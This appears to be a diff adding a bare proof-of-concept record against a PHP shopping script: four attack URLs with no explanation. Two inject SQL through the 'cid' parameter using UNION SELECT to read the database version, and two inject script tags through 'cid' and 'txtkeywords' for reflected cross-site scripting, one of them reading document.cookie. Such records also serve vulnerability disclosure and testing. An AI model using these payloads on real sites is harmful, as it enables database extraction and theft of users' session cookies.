@@ -1,0 +1,9 @@
+http://www.example.com/paypalshopping/index.php?cid=7%20union%20all%20select%201,2,3,version(),5,6,7--
+
+http://www.example.com/paypalshopping/index.php?cid=1%20AND%201=null+union+select+1,2,3,version(),5,6,7--
+
+http://www.example.com/paypalshopping/index.php?cid=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+
+http://www.example.com/paypalshopping/index.php?txtkeywords=%3CSCRIPT%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2FSCRIPT%3E&amp;cmdSearch=Search
+
+
